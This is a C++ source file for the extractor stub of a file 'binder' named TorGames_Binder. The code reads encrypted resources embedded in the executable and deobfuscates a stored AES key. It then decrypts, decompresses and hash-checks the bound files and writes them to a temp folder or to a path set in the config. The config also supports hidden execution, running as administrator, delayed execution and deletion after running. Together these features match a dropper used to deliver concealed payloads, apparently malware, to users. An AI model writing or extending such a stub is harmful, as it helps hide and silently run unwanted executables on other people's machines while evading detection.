// ============================================================================
// File: src/Extractor.cpp (Stub - UPDATED)
// Purpose: Implementation with decryption and decompression
// ============================================================================

#include "Extractor.h"
#include "../crypto/crypto.h"
#include "../compression/compression.h"
#include "../hash/hash.h"

#include <windows.h>
#include <shlwapi.h>
#include <fstream>
#include <sstream>

namespace Extractor {

static std::string g_lastError;
static std::vector<uint8_t> g_encryptionKey;
static bool g_initialized = false;

// Forward declaration
static bool ParseConfig(const std::string& json, BinderConfig& config);

bool Initialize() {
    if (g_initialized) {
        return true;
    }

    // Initialize crypto and hash modules
    if (!Crypto::Initialize()) {
        g_lastError = "Failed to initialize crypto module";
        return false;
    }

    if (!Hash::Initialize()) {
        g_lastError = "Failed to initialize hash module";
        return false;
    }

    // Try to load encryption key
    HMODULE hModule = GetModuleHandleA(nullptr);
    HRSRC hKeyRes = FindResourceA(hModule, MAKEINTRESOURCEA(1), MAKEINTRESOURCEA(RT_BINDER_KEY));

    if (hKeyRes) {
        HGLOBAL hKeyData = LoadResource(hModule, hKeyRes);
        DWORD keyDataSize = SizeofResource(hModule, hKeyRes);

        if (hKeyData && keyDataSize == AES_KEY_SIZE * 2) {
            const uint8_t* keyPtr = static_cast<const uint8_t*>(LockResource(hKeyData));

            // Extract obfuscated key and mask
            std::vector<uint8_t> obfuscatedKey(keyPtr, keyPtr + AES_KEY_SIZE);
            std::vector<uint8_t> mask(keyPtr + AES_KEY_SIZE, keyPtr + AES_KEY_SIZE * 2);

            // Deobfuscate key
            g_encryptionKey = Crypto::DeobfuscateKey(obfuscatedKey, mask);
        }
    }

    g_initialized = true;
    return true;
}

void Cleanup() {
    Crypto::Cleanup();
    Hash::Cleanup();

    // Securely clear key from memory
    if (!g_encryptionKey.empty()) {
        SecureZeroMemory(g_encryptionKey.data(), g_encryptionKey.size());
        g_encryptionKey.clear();
    }

    g_initialized = false;
}

bool LoadConfig(BinderConfig& config) {
    if (!g_initialized && !Initialize()) {
        return false;
    }

    HMODULE hModule = GetModuleHandleA(nullptr);
    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(1), MAKEINTRESOURCEA(RT_BINDER_CONFIG));

    if (!hRes) {
        g_lastError = "Configuration resource not found";
        return false;
    }

    HGLOBAL hData = LoadResource(hModule, hRes);
    DWORD dataSize = SizeofResource(hModule, hRes);

    if (!hData || dataSize == 0) {
        g_lastError = "Failed to load configuration resource";
        return false;
    }

    const uint8_t* dataPtr = static_cast<const uint8_t*>(LockResource(hData));
    std::vector<uint8_t> configData(dataPtr, dataPtr + dataSize);

    // Decrypt if key is available
    std::string configJson;
    if (!g_encryptionKey.empty()) {
        auto decryptResult = Crypto::Decrypt(configData, g_encryptionKey);
        if (decryptResult.error != Crypto::CryptoError::Success) {
            g_lastError = "Failed to decrypt configuration: " + decryptResult.errorMessage;
            return false;
        }
        configJson.assign(decryptResult.data.begin(), decryptResult.data.end());
    } else {
        configJson.assign(configData.begin(), configData.end());
    }

    // Parse JSON configuration
    return ParseConfig(configJson, config);
}

ExtractResult ExtractFile(
    int resourceId,
    const BoundFileConfig& config,
    const std::string& extractFolder
) {
    ExtractResult result;
    result.error = ExtractorError::Success;

    if (!g_initialized && !Initialize()) {
        result.error = ExtractorError::FileExtractFailed;
        result.errorMessage = "Extractor not initialized";
        return result;
    }

    HMODULE hModule = GetModuleHandleA(nullptr);
    HRSRC hRes = FindResourceA(
        hModule,
        MAKEINTRESOURCEA(resourceId),
        MAKEINTRESOURCEA(RT_BINDER_FILE)
    );

    if (!hRes) {
        result.error = ExtractorError::FileExtractFailed;
        result.errorMessage = "File resource not found: " + std::to_string(resourceId);
        return result;
    }

    HGLOBAL hData = LoadResource(hModule, hRes);
    DWORD dataSize = SizeofResource(hModule, hRes);

    if (!hData || dataSize == 0) {
        result.error = ExtractorError::FileExtractFailed;
        result.errorMessage = "Failed to load file resource";
        return result;
    }

    const uint8_t* dataPtr = static_cast<const uint8_t*>(LockResource(hData));
    std::vector<uint8_t> fileData(dataPtr, dataPtr + dataSize);

    // Step 1: Decrypt if encrypted
    if (!g_encryptionKey.empty()) {
        auto decryptResult = Crypto::Decrypt(fileData, g_encryptionKey);
        if (decryptResult.error != Crypto::CryptoError::Success) {
            result.error = ExtractorError::FileDecryptFailed;
            result.errorMessage = "Decryption failed: " + decryptResult.errorMessage;
            return result;
        }
        fileData = std::move(decryptResult.data);
    }

    // Step 2: Decompress if compressed
    if (config.compressedSize != config.fileSize && config.compressedSize > 0) {
        auto decompressResult = Compression::Decompress(fileData);
        if (decompressResult.error != Compression::CompressionError::Success) {
            result.error = ExtractorError::FileDecompressFailed;
            result.errorMessage = "Decompression failed: " + decompressResult.errorMessage;
            return result;
        }
        fileData = std::move(decompressResult.data);
    }

    // Step 3: Verify hash if available
    if (!config.sha256Hash.empty()) {
        auto hashResult = Hash::SHA256(fileData);
        if (hashResult.error != Hash::HashError::Success) {
            result.error = ExtractorError::HashVerificationFailed;
            result.errorMessage = "Hash calculation failed";
            return result;
        }

        std::string calculatedHash = Hash::HashToHex(hashResult.hash);
        if (calculatedHash != config.sha256Hash) {
            result.error = ExtractorError::HashVerificationFailed;
            result.errorMessage = "Hash mismatch - file may be corrupted or tampered";
            return result;
        }
    }

    // Step 4: Write to disk
    std::string outputPath;
    if (!config.extractPath.empty()) {
        outputPath = config.extractPath;
    } else {
        outputPath = extractFolder + "\\" + config.filename;
    }

    std::ofstream outFile(outputPath, std::ios::binary);
    if (!outFile.is_open()) {
        result.error = ExtractorError::FileWriteFailed;
        result.errorMessage = "Failed to create output file: " + outputPath;
        return result;
    }

    outFile.write(reinterpret_cast<const char*>(fileData.data()), fileData.size());
    outFile.close();

    if (!outFile.good()) {
        result.error = ExtractorError::FileWriteFailed;
        result.errorMessage = "Failed to write file data";
        return result;
    }

    result.extractedPath = outputPath;
    return result;
}

bool ExtractAll(
    const BinderConfig& config,
    const std::string& extractFolder,
    std::vector<std::string>& extractedPaths
) {
    extractedPaths.clear();
    extractedPaths.reserve(config.files.size());

    for (size_t i = 0; i < config.files.size(); ++i) {
        const auto& file = config.files[i];

        auto result = ExtractFile(
            static_cast<int>(i + 1),
            file,
            extractFolder
        );

        if (result.error != ExtractorError::Success) {
            g_lastError = result.errorMessage;
            return false;
        }

        extractedPaths.push_back(result.extractedPath);
    }

    return true;
}

std::string GetTempExtractionFolder() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    std::ostringstream folderName;
    folderName << tempPath << "TorGames_Binder_" << GetCurrentProcessId();

    return folderName.str();
}

bool CreateExtractionFolder(const std::string& folderPath) {
    return CreateDirectoryA(folderPath.c_str(), nullptr) ||
           ::GetLastError() == ERROR_ALREADY_EXISTS;
}

bool CleanupExtractionFolder(
    const std::string& folderPath,
    const std::vector<std::string>& excludeFiles
) {
    // Retry parameters
    const int MAX_RETRIES = 3;
    const int RETRY_DELAY_MS = 100;

    WIN32_FIND_DATAA findData;
    std::string searchPath = folderPath + "\\*";

    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return true; // Folder doesn't exist or empty
    }

    do {
        if (strcmp(findData.cFileName, ".") == 0 ||
            strcmp(findData.cFileName, "..") == 0) {
            continue;
        }

        std::string filePath = folderPath + "\\" + findData.cFileName;

        // Check if file should be excluded
        bool exclude = false;
        for (const auto& excludePath : excludeFiles) {
            if (_stricmp(filePath.c_str(), excludePath.c_str()) == 0) {
                exclude = true;
                break;
            }
        }

        if (!exclude) {
            // Try to delete with retries
            for (int retry = 0; retry < MAX_RETRIES; ++retry) {
                if (DeleteFileA(filePath.c_str())) {
                    break;
                }
                Sleep(RETRY_DELAY_MS);
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);

    // Try to remove the folder
    for (int retry = 0; retry < MAX_RETRIES; ++retry) {
        if (RemoveDirectoryA(folderPath.c_str())) {
            return true;
        }
        Sleep(RETRY_DELAY_MS);
    }

    return false;
}

std::string GetLastError() {
    return g_lastError;
}

// Simple JSON value extraction helpers
static std::string ExtractString(const std::string& json, const std::string& key) {
    std::string searchKey = "\"" + key + "\":\"";
    size_t pos = json.find(searchKey);
    if (pos == std::string::npos) return "";

    pos += searchKey.length();
    size_t endPos = json.find("\"", pos);
    if (endPos == std::string::npos) return "";

    // Handle escape sequences
    std::string result;
    for (size_t i = pos; i < endPos; ++i) {
        if (json[i] == '\\' && i + 1 < endPos) {
            switch (json[i + 1]) {
                case 'n': result += '\n'; break;
                case 'r': result += '\r'; break;
                case 't': result += '\t'; break;
                case '\\': result += '\\'; break;
                case '"': result += '"'; break;
                default: result += json[i + 1]; break;
            }
            ++i;
        } else {
            result += json[i];
        }
    }
    return result;
}

static int ExtractInt(const std::string& json, const std::string& key) {
    std::string searchKey = "\"" + key + "\":";
    size_t pos = json.find(searchKey);
    if (pos == std::string::npos) return 0;

    pos += searchKey.length();
    while (pos < json.length() && (json[pos] == ' ' || json[pos] == '\t')) ++pos;

    return atoi(json.c_str() + pos);
}

static bool ExtractBool(const std::string& json, const std::string& key) {
    std::string searchKey = "\"" + key + "\":";
    size_t pos = json.find(searchKey);
    if (pos == std::string::npos) return false;

    pos += searchKey.length();
    while (pos < json.length() && (json[pos] == ' ' || json[pos] == '\t')) ++pos;

    return (json.substr(pos, 4) == "true");
}

static bool ParseConfig(const std::string& json, BinderConfig& config) {
    // Parse global config
    config.configVersion = ExtractInt(json, "configVersion");
    config.requireAdmin = ExtractBool(json, "requireAdmin");
    config.compressionType = ExtractInt(json, "compressionType");
    config.encryptionType = ExtractInt(json, "encryptionType");

    // Parse files array
    config.files.clear();

    size_t filesPos = json.find("\"files\":[");
    if (filesPos == std::string::npos) {
        return false;
    }

    filesPos += 9; // Skip "files":[
    size_t filesEnd = json.rfind("]");
    if (filesEnd == std::string::npos || filesEnd <= filesPos) {
        return false;
    }

    // Find each file object
    size_t objStart = filesPos;
    while ((objStart = json.find("{", objStart)) != std::string::npos && objStart < filesEnd) {
        size_t objEnd = json.find("}", objStart);
        if (objEnd == std::string::npos || objEnd > filesEnd) break;

        std::string fileJson = json.substr(objStart, objEnd - objStart + 1);

        BoundFileConfig file;
        file.filename = ExtractString(fileJson, "filename");
        file.executionOrder = ExtractInt(fileJson, "executionOrder");
        file.executeFile = ExtractBool(fileJson, "executeFile");
        file.waitForExit = ExtractBool(fileJson, "waitForExit");
        file.runHidden = ExtractBool(fileJson, "runHidden");
        file.runAsAdmin = ExtractBool(fileJson, "runAsAdmin");
        file.extractPath = ExtractString(fileJson, "extractPath");
        file.commandLineArgs = ExtractString(fileJson, "commandLineArgs");
        file.executionDelay = ExtractInt(fileJson, "executionDelay");
        file.deleteAfterExecution = ExtractBool(fileJson, "deleteAfterExecution");
        file.fileSize = static_cast<DWORD>(ExtractInt(fileJson, "fileSize"));
        file.compressedSize = static_cast<DWORD>(ExtractInt(fileJson, "compressedSize"));
        file.sha256Hash = ExtractString(fileJson, "sha256Hash");

        config.files.push_back(file);
        objStart = objEnd + 1;
    }

    return !config.files.empty();
}

} // namespace Extractor